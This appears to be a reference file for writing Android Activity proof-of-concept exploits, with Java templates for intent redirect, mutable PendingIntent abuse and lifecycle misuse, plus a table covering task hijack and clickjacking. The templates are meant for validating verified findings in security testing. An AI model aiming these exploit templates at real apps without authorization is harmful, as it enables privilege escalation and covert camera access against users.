---
name: poc-app-activity
description: Activity PoC reference covering exported access, intent redirect, fragment injection, path traversal, PendingIntent abuse, result leakage, task hijack, clickjacking, and lifecycle misuse.
---

# Activity PoC Reference

Use this reference for attacker-reachable activity flows. Activity PoCs usually fit `direct-trigger`, `returned-handle`, or `ui-assisted` shapes.

## Contents

- [Template Wiring](#template-wiring)
- [Construction Matrix](#construction-matrix)
- [Shared Inputs](#shared-inputs)
- [Pattern 1 - Direct Activity Launch](#pattern-1---direct-activity-launch)
- [Pattern 2 - Returned Handle Or Result Flow](#pattern-2---returned-handle-or-result-flow)
- [Pattern 3 - UI-Assisted Validation](#pattern-3---ui-assisted-validation)
- [Construction Notes](#construction-notes)

## Template Wiring

These snippets show the execution body shape, not the full class shape. In the current template:

- put the execution body in a helper method or lambda
- register it in `ExploitRegistry`
- let `PoCActivity` handle both button execution and `?exploit=<id>` route execution

## Construction Matrix

| Vulnerability | PoC shape | Typical support | Visible success |
|---------------|--------------|-----------------|-----------------|
| exported access | `direct-trigger` | none | protected screen or action becomes reachable |
| intent redirect | `direct-trigger` | none | nested Intent reaches internal component |
| fragment injection | `direct-trigger` | none | internal fragment is loaded |
| path traversal | `direct-trigger` | none | attacker-controlled path is accepted |
| PendingIntent abuse | `returned-handle` | none | victim-identity action executes |
| `setResult()` leak | `interception` | helper activity for result capture | sensitive result is returned |
| task hijack | `ui-assisted` | helper activity in Manifest | victim task shows attacker UI |
| clickjacking | `ui-assisted` | overlay service | user-facing trusted action is obscured |
| lifecycle misuse | `ui-assisted` | none | protected resource remains active after backgrounding |

## Shared Inputs

- victim activity class
- launch action, extras, URI, or nested Intent key
- whether the flow needs `startActivityForResult()`
- whether helper Manifest components are required
- visible success signal

## Pattern 1 - Direct Activity Launch

Use for exported access, intent redirect, fragment injection, and many path-traversal cases.

```java
private static void runActivityIntentRedirect(Context context) {
    Intent nested = new Intent();
    nested.setClassName("com.target", "com.target.InternalAdminActivity");
    nested.putExtra("admin_cmd", "grant_permission");

    Intent intent = new Intent();
    intent.setClassName("com.target", "com.target.ForwardActivity");
    intent.putExtra("forward_intent", nested);
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.startActivity(intent);
    Log.i("PoC", "Launched ForwardActivity with nested attacker-controlled Intent");
}
```

Registration shape:

```java
static {
    register("activity-launch", "Launch Exported Activity", () -> runActivityIntentRedirect(appContext));
}
```

Fill with:

- real target class
- real nested Intent key or fragment selector
- real path, URI, or command extras from the verified finding

Use when:

- the vulnerable path is proven by one `startActivity(...)`
- no result-capture or helper UI flow is required

## Pattern 2 - Returned Handle Or Result Flow

Use for mutable `PendingIntent` delivery or `setResult()` leakage.

```java
private static void runActivityPendingIntentAbuse(Context context) {
    Intent malicious = new Intent();
    malicious.setClassName("com.target", "com.target.PrivilegedActivity");

    PendingIntent pendingIntent = PendingIntent.getActivity(
        context,
        0,
        malicious,
        PendingIntent.FLAG_MUTABLE
    );

    Intent intent = new Intent();
    intent.setClassName("com.target", "com.target.ExecutePendingIntentActivity");
    intent.putExtra("pending_intent", pendingIntent);
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.startActivity(intent);
    Log.i("PoC", "Delivered attacker-controlled PendingIntent to exported activity");
}
```

Registration shape:

```java
static {
    register("activity-handle", "Deliver Returned Handle", () -> runActivityPendingIntentAbuse(appContext));
}
```

Use when:

- the activity accepts a `PendingIntent` from an external caller, or
- the activity returns sensitive data via `setResult()` and the PoC can capture it with a helper activity

Fill with:

- real returned-handle extra key or capture source
- real helper activity shape if result capture is required

## Pattern 3 - UI-Assisted Validation

Use for task hijack, clickjacking, and lifecycle misuse.

```java
private static void runActivityLifecycleMisuse(Context context) {
    Intent camera = new Intent();
    camera.setClassName("com.target", "com.target.CameraActivity");
    camera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.startActivity(camera);

    new Handler(Looper.getMainLooper()).postDelayed(() -> {
        Intent home = new Intent(Intent.ACTION_MAIN);
        home.addCategory(Intent.CATEGORY_HOME);
        home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(home);
        Log.i("PoC", "Moved target activity to background. Check whether the protected resource remains active.");
    }, 2000);
}
```

Registration shape:

```java
static {
    register("activity-ui", "Run UI-Assisted Validation", () -> runActivityLifecycleMisuse(appContext));
}
```

Manifest support:

- helper activity with matching `taskAffinity` for task hijack
- helper service with overlay permission for clickjacking

Use when:

- the finding depends on visible task placement, overlay timing, or lifecycle state changes

Do not use the `ui-assisted` shape for ordinary exported launches that already prove the bug.

## Construction Notes

- prefer one direct launch helper when the bug is already visible on first open
- only add helper activities or services when result capture or UI placement is part of the verified path
- keep nested `Intent`, fragment selector, or path extras explicit in the helper body instead of hiding them behind generic wrappers
